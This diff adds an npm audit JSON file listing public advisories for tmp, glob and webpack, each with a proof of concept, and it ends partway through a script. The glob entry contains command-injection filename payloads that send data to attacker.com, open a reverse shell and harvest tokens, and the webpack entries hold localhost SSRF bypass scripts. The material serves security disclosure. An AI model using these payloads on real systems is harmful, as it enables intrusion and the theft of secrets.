@@ -1,0 +1,1471 @@
+{
+  "advisories": {
+    "1109537": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
+      "created": "2025-08-06T17:06:04.000Z",
+      "id": 1109537,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+      "reported_by": null,
+      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-54798"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "tmp",
+      "vulnerable_versions": "<=0.2.3",
+      "github_advisory_id": "GHSA-52f5-9888-hmc6",
+      "recommendation": "Upgrade to version 0.2.4 or later",
+      "patched_versions": ">=0.2.4",
+      "updated": "2025-11-03T21:34:21.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
+    },
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.4.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1113041": {
+      "findings": [
+        {
+          "version": "5.97.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-8fgc-7cc6-rx7x\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68458\n- https://github.com/advisories/GHSA-8fgc-7cc6-rx7x",
+      "created": "2026-02-05T18:38:10.000Z",
+      "id": 1113041,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen `experiments.buildHttp` is enabled, webpackÔÇÖs HTTP(S) resolver (`HttpUriPlugin`) can be bypassed to fetch resources from **hosts outside `allowedUris`** by using crafted URLs that include **userinfo** (`username:password@host`). If `allowedUris` enforcement relies on a **raw string prefix check** (e.g., `uri.startsWith(allowed)`), a URL that *looks* allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (outbound requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion** (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache.\n\nReproduced on:\n- webpack version: **5.104.0**\n- Node version: **v18.19.1**\n\n### Details\n**Root cause (high level):** `allowedUris` validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., `new URL(uri)`), which interprets the **authority** as the part after `@`.\n\nExample crafted URL:\n- `http://127.0.0.1:9000@127.0.0.1:9100/secret.js`\n\nIf the allow-list is `[\"http://127.0.0.1:9000\"]`, then:\n- Raw string check:  \n  `crafted.startsWith(\"http://127.0.0.1:9000\")` ÔåÆ **true**\n- URL parsing (WHAT `new URL()` will contact):  \n  `origin` ÔåÆ `http://127.0.0.1:9100` (host/port after `@`)\n\nAs a result, webpack fetches `http://127.0.0.1:9100/secret.js` even though `allowedUris` only included `http://127.0.0.1:9000`.\n\n**Evidence from reproduction:**\n- Server logs showed the internal-only endpoint being fetched:\n  - `[internal] 200 /secret.js served (...)` (observed multiple times)\n- Attacker-side build output showed:\n  - the internal secret marker was present in the **bundle**\n  - the internal secret marker was present in the **buildHttp cache**\n\n<img width=\"1651\" height=\"381\" alt=\"image-2\" src=\"https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492\" />\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only ÔÇ£internal serviceÔÇØ) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-userinfo-poc && cd split-userinfo-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\n\nconst ALLOWED_PORT = 9000;   // allowlisted-looking host\nconst INTERNAL_PORT = 9100;  // actual target if bypass succeeds\n\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `// internal-only\\n` +\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction listen(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // \"Allowed\" host (should NOT be contacted if bypass works as intended)\n  await listen(ALLOWED_PORT, (req, res) => {\n    console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`);\n    res.statusCode = 200;\n    res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n    res.end(`export default \"ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY\";\\n`);\n  });\n\n  // Internal-only service (SSRF-like target)\n  await listen(INTERNAL_PORT, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      return;\n    }\n    console.log(`[internal] 404 ${req.method} ${req.url}`);\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(\"\\nServers up:\");\n  console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`);\n  console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`);\n})();\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\n\nfunction fmtBool(b) { return b ? \"Ô£à\" : \"ÔØî\"; }\n\nasync function walk(dir) {\n  const out = [];\n  let items;\n  try { items = await fs.readdir(dir, { withFileTypes: true }); }\n  catch { return out; }\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    const s1 = buf.toString(\"utf8\");\n    if (s1.includes(needle)) return true;\n    const s2 = buf.toString(\"latin1\");\n    return s2.includes(needle);\n  } catch {\n    return false;\n  }\n}\n\n(async () => {\n  const webpackVersion = require(\"webpack/package.json\").version;\n\n  const ALLOWED_PORT = 9000;\n  const INTERNAL_PORT = 9100;\n\n  // NOTE: allowlist is intentionally specified without a trailing slash\n  // to demonstrate the risk of raw string prefix checks.\n  const allowedUri = `http://127.0.0.1:${ALLOWED_PORT}`;\n\n  // Crafted URL using userinfo so that:\n  // - The string begins with allowedUri\n  // - The actual authority (host:port) after '@' is INTERNAL_PORT\n  const crafted = `http://127.0.0.1:${ALLOWED_PORT}@127.0.0.1:${INTERNAL_PORT}/secret.js`;\n  const parsed = new URL(crafted);\n\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-httpuri-userinfo-poc-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(crafted)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedUri],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  console.log(\"\\n[ENV]\");\n  console.log(`- webpack version: ${webpackVersion}`);\n  console.log(`- node version:    ${process.version}`);\n  console.log(`- allowedUris:     ${JSON.stringify([allowedUri])}`);\n\n  console.log(\"\\n[CRAFTED URL]\");\n  console.log(`- import specifier: ${crafted}`);\n  console.log(`- WHAT startsWith() sees: begins with \"${allowedUri}\" => ${fmtBool(crafted.startsWith(allowedUri))}`);\n  console.log(`- WHAT URL() parses:`);\n  console.log(`  - username: ${JSON.stringify(parsed.username)} (userinfo)`);\n  console.log(`  - password: ${JSON.stringify(parsed.password)} (userinfo)`);\n  console.log(`  - hostname: ${parsed.hostname}`);\n  console.log(`  - port:     ${parsed.port}`);\n  console.log(`  - origin:   ${parsed.origin}`);\n  console.log(`  - NOTE: request goes to origin above (host/port after @), not to \"${allowedUri}\"`);\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n\n      if (stats.hasErrors()) {\n        console.error(\"\\n[WEBPACK ERRORS]\");\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const foundSecret = m ? m[0] : null;\n\n      console.log(\"\\n[RESULT]\");\n      console.log(`- temp dir:  ${tmp}`);\n      console.log(`- bundle:    ${bundlePath}`);\n      console.log(`- lockfile:  ${lockfile}`);\n      console.log(`- cacheDir:  ${cacheDir}`);\n\n      console.log(\"\\n[SECURITY CHECK]\");\n      console.log(`- bundle contains INTERNAL_ONLY_SECRET_* : ${fmtBool(!!foundSecret)}`);\n\n      if (foundSecret) {\n        const lockHit = await fileContains(lockfile, foundSecret);\n\n        const cacheFiles = await walk(cacheDir);\n        let cacheHit = false;\n        for (const f of cacheFiles) {\n          if (await fileContains(f, foundSecret)) { cacheHit = true; break; }\n        }\n\n        console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n        console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      }\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected vs Actual\n\nExpected: The import should be blocked because the effective request destination is http://127.0.0.1:9100/secret.js, which is outside allowedUris (only http://127.0.0.1:9000 is allow-listed).\n\nActual: The crafted URL passes the allow-list prefix validation, webpack fetches the internal-only resource on port 9100 (confirmed by server logs), and the secret marker appears in the bundle and buildHttp cache.\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to build-time SSRF behavior and untrusted content inclusion in build outputs.\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary. If an attacker can influence the imported HTTP(S) specifier (e.g., via source contribution, dependency manipulation, or configuration), they can cause outbound requests from the build environment to endpoints outside the allow-list (including internal-only services, subject to network reachability). The fetched response can be treated as module source and included in build outputs and persisted in the buildHttp cache, increasing the risk of leakage or supply-chain contamination.",
+      "reported_by": null,
+      "title": "webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68458"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "webpack",
+      "vulnerable_versions": ">=5.49.0 <=5.104.0",
+      "github_advisory_id": "GHSA-8fgc-7cc6-rx7x",
+      "recommendation": "Upgrade to version 5.104.1 or later",
+      "patched_versions": ">=5.104.1",
+      "updated": "2026-02-06T14:39:32.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-8fgc-7cc6-rx7x"
+    },
+    "1113042": {
+      "findings": [
+        {
+          "version": "5.97.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-38r7-794h-5758\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68157\n- https://github.com/advisories/GHSA-38r7-794h-5758",
+      "created": "2026-02-05T18:35:28.000Z",
+      "id": 1113042,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen `experiments.buildHttp` is enabled, webpackÔÇÖs HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.\n\n### Details\nIn the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`.\n\nPractical consequence: if an ÔÇ£allowedÔÇØ host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.\n\n**Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.\n\n<img width=\"1648\" height=\"461\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524\" />\n\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only ÔÇ£internal serviceÔÇØ) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-ssrf-poc && cd split-ssrf-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\nconst url = require(\"url\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction start(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // Internal-only service (SSRF target)\n  await start(internalPort, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      return;\n    }\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  // Allowed host (redirector)\n  await start(allowedPort, (req, res) => {\n    const parsed = url.parse(req.url, true);\n\n    if (parsed.pathname === \"/redirect.js\") {\n      const to = parsed.query.to || internalUrlDefault;\n\n      // Safety guard: only allow redirecting to localhost internal service in this PoC\n      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {\n        res.statusCode = 400;\n        res.end(\"to must be internal-only in this PoC\");\n        console.log(`[allowed] blocked redirect to: ${to}`);\n        return;\n      }\n\n      res.statusCode = 302;\n      res.setHeader(\"Location\", to);\n      res.end(\"redirecting\");\n      console.log(`[allowed] 302 /redirect.js -> ${to}`);\n      return;\n    }\n\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(`\\nServer running:`);\n  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);\n  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);\n})();\n```\n\n#### 3) Create attacker.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\nconst webpackPkg = require(\"webpack/package.json\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst allowedBase = `http://127.0.0.1:${allowedPort}/`;\nconst internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;\nconst entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;\n\nasync function walk(dir) {\n  const out = [];\n  const items = await fs.readdir(dir, { withFileTypes: true });\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    return buf.toString(\"utf8\").includes(needle) || buf.toString(\"latin1\").includes(needle);\n  } catch {\n    return false;\n  }\n}\n\nasync function findInFiles(files, needle) {\n  const hits = [];\n  for (const f of files) if (await fileContains(f, needle)) hits.push(f);\n  return hits;\n}\n\nconst fmtBool = b => (b ? \"Ô£à\" : \"ÔØî\");\n\n(async () => {\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-attacker-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(entryUrl)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedBase],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n      if (stats.hasErrors()) {\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const secret = m ? m[0] : null;\n\n      console.log(\"\\n[ATTACKER RESULT]\");\n      console.log(`- webpack version: ${webpackPkg.version}`);\n      console.log(`- node version: ${process.version}`);\n      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);\n      console.log(`- imported URL (allowed only): ${entryUrl}`);\n      console.log(`- temp dir: ${tmp}`);\n      console.log(`- lockfile: ${lockfile}`);\n      console.log(`- cacheDir: ${cacheDir}`);\n      console.log(`- bundle:   ${bundlePath}`);\n\n      if 